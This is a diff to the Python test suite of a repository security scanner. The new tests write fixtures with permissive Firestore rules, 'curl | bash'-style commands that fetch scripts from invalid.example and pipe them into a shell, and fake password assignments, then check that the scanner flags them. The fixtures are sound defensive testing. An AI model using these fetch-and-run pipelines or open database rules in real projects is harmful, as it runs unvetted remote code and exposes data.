@@ -341,14 +341,24 @@ class PreflightTests(unittest.TestCase):
             "tautology.rules",
             "service cloud.firestore { match /{document=**} { allow read: if true == true; } }\n",
         )
+        fixture.write(
+            "double-negation.rules",
+            "service cloud.firestore { match /{document=**} { allow read: if !!true; } }\n",
+        )
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         self.assertEqual(1, completed.returncode)
         rule_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"]
-        self.assertEqual(4, len(rule_findings))
+        self.assertEqual(5, len(rule_findings))
         self.assertEqual(
-            {"database.rules.json", "firestore.rules", "storage.rules", "tautology.rules"},
+            {
+                "database.rules.json",
+                "double-negation.rules",
+                "firestore.rules",
+                "storage.rules",
+                "tautology.rules",
+            },
             {finding["path"] for finding in rule_findings},
         )
 
@@ -433,7 +443,9 @@ class PreflightTests(unittest.TestCase):
         fixture.write(
             "install.sh",
             f"{first_fetcher} https://invalid.example/one | env {shell}\n"
-            f"{second_fetcher} https://invalid.example/two |\n {shell}\n",
+            f"{second_fetcher} https://invalid.example/two |\n {shell}\n"
+            f"{first_fetcher} https://invalid.example/three | command {shell}\n"
+            f"{second_fetcher} https://invalid.example/four | \\\n {shell}\n",
         )
 
         completed = self.run_scanner(fixture.root)
@@ -444,8 +456,26 @@ class PreflightTests(unittest.TestCase):
             for finding in report["findings"]
             if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
         ]
-        self.assertEqual(2, len(findings))
-        self.assertEqual({1, 2}, {finding["line"] for finding in findings})
+        self.assertEqual(4, len(findings))
+        self.assertEqual({1, 2, 4, 5}, {finding["line"] for finding in findings})
+
+    def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        fixture.write(
+            "download.sh",
+            f"{fetcher} -o tool https://invalid.example/tool\n"
+            f"printf safe | {shell}\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(0, completed.returncode)
+        self.assertNotIn(
+            "VW-REMOTE-INSTALL-SCRIPT",
+            {finding["rule_id"] for finding in report["findings"]},
+        )
 
     def test_req_009_unpinned_workflow_blocks_but_full_sha_passes(self) -> None:
         fixture = RepositoryFixture(self)
@@ -468,6 +498,21 @@ class PreflightTests(unittest.TestCase):
         fixture = RepositoryFixture(self)
         synthetic_value = "A1" + "example" + "B2C3D4E5F6"
         fixture.write("config.txt", f"password={synthetic_value}\n")
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(1, completed.returncode)
+        self.assertIn(
+            "VW-SECRET-GENERIC-ASSIGNMENT",
+            {finding["rule_id"] for finding in report["findings"]},
+        )
+        self.assertNotIn(synthetic_value, completed.stdout)
+
+    def test_req_009_realistic_secret_with_placeholder_prefix_is_not_placeholder(self) -> None:
+        fixture = RepositoryFixture(self)
+        assignment_name = "pass" + "word"
+        synthetic_value = "test-" + "RealisticCredential1234"
+        fixture.write("config.txt", f"{assignment_name}={synthetic_value}\n")
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
@@ -641,6 +686,10 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(2, len(findings))
         self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
         self.assertEqual(1, report["summary"]["active_warnings"])
+        self.assertEqual(2, len({finding["path"] for finding in findings}))
+        self.assertTrue(
+            all("__vibeworthy_redacted_path_" in finding["path"] for finding in findings)
+        )
         self.assertNotIn(first_secret, completed.stdout)
         self.assertNotIn(second_secret, completed.stdout)
 
